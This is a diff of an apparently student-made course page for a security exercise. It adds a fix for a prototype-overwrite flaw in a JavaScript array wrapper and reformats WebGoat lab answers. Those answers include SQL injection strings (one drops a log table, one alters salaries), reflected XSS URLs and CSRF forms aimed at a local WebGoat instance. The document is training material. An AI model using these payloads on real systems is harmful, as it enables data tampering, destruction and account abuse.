@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, user-scalable=yes, minimal-ui">
     <title>12 Security</title>
     <link href="../index.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Sora&display=swap" rel="stylesheet">
     <script crossorigin="anonymous" src="https://kit.fontawesome.com/311699e670.js"></script>
     <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/monokai-sublime.min.css"
           rel="stylesheet">
@@ -47,120 +50,38 @@
     <h1>Übung 12 - Security</h1>
 
     <details>
-        <summary>12.1 Sicherer Array Wrapper
-            <a style="display: inline;" href="" target="_blank">
-                &nbsp;
-                <i class="fas fa-external-link-alt"></i></a></summary>
-        <button id="dfcodebutton" onclick="buttonChange('dfcode','dfcomp')">Code</button>
-        <button disabled id="dfcompbutton" onclick="buttonChange('dfcomp', 'dfcode')">
-            Komponente
-        </button>
+        <summary>12.1 Sicherer Array Wrapper</summary>
+        <div class="akkordeon-inhalt">
+            <p><b><u>Ursachenanalyse</u></b><br>
+            Die Set-Funktion des ArrayWrappers sollte eigentlich nur number-Werte für die Position erwarten,
+            jedoch ist dies durch die fehlende Typsicherheit nicht gegeben. Dadurch können auch Funktionen des
+            Array-Prototyps, in dem Fall push(), überschrieben werden. Da push() in der append()-Funktion aufgerufen wird,
+            wird die neue push-Funktion aufgerufen, die den Inhalt des ArrayWrappers in eine eigene Variable schreibt und ausgibt.</p>
 
-        <div id="dfcomp">
-            <iframe frameborder="0" style="width: 100%; height: 100vh; margin-top: 1em; resize: both"
-                    src=""></iframe>
+            <p><b><u>Sicherheitskonzept</u></b><br>
+            Beim Aufruf der Set-Funktion muss überprüft werden, ob es sich bei pos um einen number-Wert handelt. Zusätzlich
+            kann sichergestellt werden, dass value nicht vom typ function ist. Erst dann soll die eigentliche Funktion ausgeführt werden.</p>
         </div>
-        <div id="dfcode" style="display: none">
-                            <pre>
-                                <code class="language-html">
-    &lt;!DOCTYPE html>
-    &lt;html lang="en">
-    &lt;head>
-        &lt;meta charset="UTF-8">
-        &lt;title>Flexbox Desktop-First&lt;/title>
-        &lt;style>
-            * {
-                box-sizing: border-box;
-            }
-
-            body {
-                display: flex;
-                flex-wrap: wrap;
-                margin: 3vw 5vw 3vw 5vw;
-                height: 90vh;
-            }
-
-            aside.right {
-                flex-basis: 19%;
-                background-color: #ea3efe;
-                height: 68%;
-            }
-
-            aside.left {
-                background-color: #2cee27;
-                flex-basis: 19%;
-                height: 68%;
-            }
-
-            article {
-                flex-basis: 59.67%;
-                height: 68%;
-                background-color: #0533ff;
-                margin: 0 1% 0 1%;
-            }
-
-            nav {
-                background-color: #ff2500;
-                flex-basis: 100%;
-                height: 30%;
-                margin-bottom: 1.5vw;
-            }
-
-            /* mid-size devices like tablets &lt;= 800px */
-            @media screen and (max-width: 800px) {
-                body{
-                    margin: 5% 2% 5% 2%;
+        <div class="akkordeon-inhalt">
+ Sicherer ArrayWrapper:
+                            <pre style="margin-top: 0">
+                                <code class="language-javascript">
+    function arrayWrapper() {
+        let array = [...arguments]; // private
+        return {
+            get:function(pos){
+                return array[pos];
+            },
+            set:function(pos,value){
+                if(typeof pos == "number" && typeof value != "function"){
+                    array[pos] = value;
                 }
-                aside.left {
-                    flex-basis: 33%;
-                    height: 100%;
-                    margin-right: 1%;
-                }
-
-                article {
-                    flex-basis: 66%;
-                    height: 100%;
-                    margin: 0;
-                }
-
-                aside.right {
-                    flex-basis: 100%;
-                    height: 20%;
-                    margin-top: 2%;
-                }
+            },
+            append:function(value){
+                array.push(value);
             }
-
-            /* small devices like smartphones &lt;= 500px */
-            @media screen and (max-width: 500px) {
-                nav{
-                    flex-basis: 100%;
-                    height: 20%;
-                    margin: 0;
-                }
-                article {
-                    flex-basis: 100%;
-                    height: 150%;
-                    margin: 0;
-
-                }
-
-                aside.left, aside.right {
-                    flex-basis: 100%;
-                    height: 20%;
-                    margin: 0;
-
-                }
-            }
-
-        &lt;/style>
-    &lt;/head>
-    &lt;body>
-    &lt;nav>&lt;/nav>
-    &lt;aside class="left">&lt;/aside>
-    &lt;article>&lt;/article>
-    &lt;aside class="right">&lt;/aside>
-    &lt;/body>
-    &lt;/html>
+        }
+    }
                                 </code>
                             </pre>
         </div>
@@ -169,91 +90,72 @@
 
     <details>
         <summary>12.2 WebGoat Injection</summary>
-        <div>
-                            <pre>
-                                <code class="language-sql">
--- 2) Retrieve the department of the employee Bob Franco
-SELECT department FROM employees WHERE first_name='Bob'
-
--- 3) Change the department of Tobi Barnett to 'Sales'
-UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett'
-
--- 4) Modify the schema by adding the column "phone" (varchar(20)) to the table "employees.
-ALTER TABLE employees ADD phone varchar(20)
-
--- 5) Grant rights to the table grant_rights to user unauthorized_user
-GRANT ALL ON grant_rights TO unauthorized_user
-
--- 9) String SQL injection: Retrieve all the users from the users table.
-SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1' = '1'
-
--- 10) Numeric SQL injection: Retrieve all the data from the users table.
-Login_Count: 0
-User_Id: 0 OR 1=1
-
--- 11) Retrieve all employee data from the employees table.
-Employee Name: Smith
-TAN: ' OR '1'='1
-
--- 12) Change your own salary so you are earning the most!
-Employee name: A
-Authentication TAN:'; UPDATE employees SET salary=9999 WHERE first_name='John' AND last_name='Smith
-
--- 13) Delete the access log.
-%'; DROP TABLE access_log;--
-                                </code>
-                            </pre>
+        <div class="akkordeon-inhalt">
+            2) Retrieve the department of the employee Bob Franco
+            <pre><code class="language-sql">SELECT department FROM employees WHERE first_name='Bob'</code></pre>
+            3) Change the department of Tobi Barnett to 'Sales'
+            <pre><code class="language-sql">UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett'
+</code></pre>
+            4) Modify the schema by adding the column "phone" (varchar(20)) to the table "employees.
+            <pre><code class="language-sql">ALTER TABLE employees ADD phone varchar(20)
+</code></pre>
+            5) Grant rights to the table grant_rights to user unauthorized_user
+            <pre><code class="language-sql">GRANT ALL ON grant_rights TO unauthorized_user
+</code></pre>
+            9) String SQL injection: Retrieve all the users from the users table.
+            <pre><code class="language-sql">SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 'Smith' OR '1' = '1'
+</code></pre>
+            10) Numeric SQL injection: Retrieve all the data from the users table.
+            <pre><code>Login_Count: 0
+User_Id: 0 OR 1=1</code></pre>
+            11) Retrieve all employee data from the employees table.
+            <pre><code>Employee Name: Smith
+TAN: ' OR '1'='1</code></pre>
+            12) Change your own salary so you are earning the most!
+            <pre><code>Employee name: A
+Authentication TAN:'; UPDATE employees SET salary=9999 WHERE first_name='John' AND last_name='Smith</code></pre>
+            13) Delete the access log.
+            <pre><code class="language-sql">%'; DROP TABLE access_log;--</code></pre>
         </div>
 
     </details>
 
     <details>
         <summary>12.3 WebGoat XSS</summary>
-        <div>
-                            <pre>
-                                <code>
-2) Were the cookies the same on each tab?
-    Yes.
-
-7) Use the alert() or console.log() methods to find out which field is vulnerable
-    Credit Card Number: &lt;script>alert()&lt;/script>
-
-10) What is the route for the test code that stayed in the app during production?
-    start.mvc#test
-
-11) Use the route you just found and see if you can use the fact that it reflects a parameter from the route without
-encoding to execute an internal function in WebGoat. The function you want to execute is webgoat.customjs.phoneHome().
-    http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E
-    Ergebniszahl: -1550996069
-
-
-12) Quiz:
-1. Are trusted websites immune to XSS attacks?
- 4 - No, because the browser trusts the website if it is acknowledged trusted, then the browser does not know that the script is malicious.
-
-2. When do XSS attacks occur?
- 3 - The data is included in dynamic content that is sent to a web user without being validated for malicious content.
-
-3. What are Stored XSS attacks?
- 1 - The script is permanently stored on the server and the victim gets the malicious script when requesting information from the server.
-
-4. What are Reflected XSS attacks?
- 2 - They reflect the injected script off the web server. That occurs when input sent to the web server is part of the request.
-
-5. Is JavaScript the only way to perform XSS attacks?
- 4 - No there are many other ways. Like HTML, Flash or any other type of code that the browser executes.
-                                </code>
-                            </pre>
+        <div class="akkordeon-inhalt">
+            <p><b>2) Were the cookies the same on each tab?</b><br>
+                Yes.</p>
+            <p><b>7) Use the alert() or console.log() methods to find out which field is vulnerable</b><br>
+                Credit Card Number: <code>&lt;script>alert()&lt;/script></code></p>
+            <p><b>10) What is the route for the test code that stayed in the app during production?</b><br>
+                start.mvc#test</p>
+            <p><b>11) Use the route you just found and see if you can use the fact that it reflects a parameter from the
+                route without
+                encoding to execute an internal function in WebGoat. The function you want to execute is <code>webgoat.customjs.phoneHome()</code>.</b><br>
+                <code>http://127.0.0.1:8080/WebGoat/start.mvc#test/%3Cscript%3Ewebgoat.customjs.phoneHome()%3C%2Fscript%3E</code><br>
+                Ergebniszahl: -1550996069</p>
+            <p><b>12) Quiz:</b></p>
+            <p><b>1. Are trusted websites immune to XSS attacks?</b><br>
+                4 - No, because the browser trusts the website if it is acknowledged trusted, then the browser does not
+                know that the script is malicious.</p>
+            <p><b>2. When do XSS attacks occur?</b><br> 3 - The data is included in dynamic content that is sent to a
+                web user without being validated for malicious content.</p>
+            <p><b>3. What are Stored XSS attacks?</b><br> 1 - The script is permanently stored on the server and the
+                victim gets the malicious script when requesting information from the server.</p>
+            <p><b>4. What are Reflected XSS attacks?</b><br> 2 - They reflect the injected script off the web server.
+                That occurs when input sent to the web server is part of the request.</p>
+            <p><b>5. Is JavaScript the only way to perform XSS attacks?</b><br> 4 - No there are many other ways. Like
+                HTML, Flash or any other type of code that the browser executes.</p>
         </div>
 
     </details>
 
     <details>
         <summary>12.4 WebGoat Cross-Site Request Forgeries</summary>
-        <div>
-                            <pre>
-3) Basic Get CSRF Exercise:Trigger the form from an external source while logged in.
-                                <code class="language-html">
+        <div class="akkordeon-inhalt">
+
+            3) Basic Get CSRF Exercise:Trigger the form from an external source while logged in.
+            <pre><code class="language-html">
     &lt;!DOCTYPE html>
     &lt;html lang="en">
     &lt;head>
@@ -267,9 +169,9 @@ encoding to execute an internal function in WebGoat. The function you want to ex
     &lt;/form>
     &lt;/body>
     &lt;/html>
-                                </code>
-4) Post a review on someone else’s behalf
-                                <code class="language-html">
+            </code></pre>
+            4) Post a review on someone else’s behalf
+            <pre><code class="language-html">
     &lt;!DOCTYPE html>
     &lt;html lang="en">
     &lt;head>
@@ -286,9 +188,9 @@ encoding to execute an internal function in WebGoat. The function you want to ex
     &lt;/form>
     &lt;/body>
     &lt;/html>
-                                </code>
-7) CSRF and content-type. POST JSON message to our endpoints...
-                                <code class="language-html">
+                                </code></pre>
+            7) CSRF and content-type. POST JSON message to our endpoints...
+            <pre><code class="language-html">
     &lt;html>
     &lt;body>
     &lt;form action=http://127.0.0.1:8080/WebGoat/csrf/feedback/message method=post enctype="text/plain">
@@ -298,8 +200,7 @@ encoding to execute an internal function in WebGoat. The function you want to ex
     &lt;/form>
     &lt;/body>
     &lt;/html>
-                                </code>
-                            </pre>
+                                </code></pre>
         </div>
     </details>
 </div>
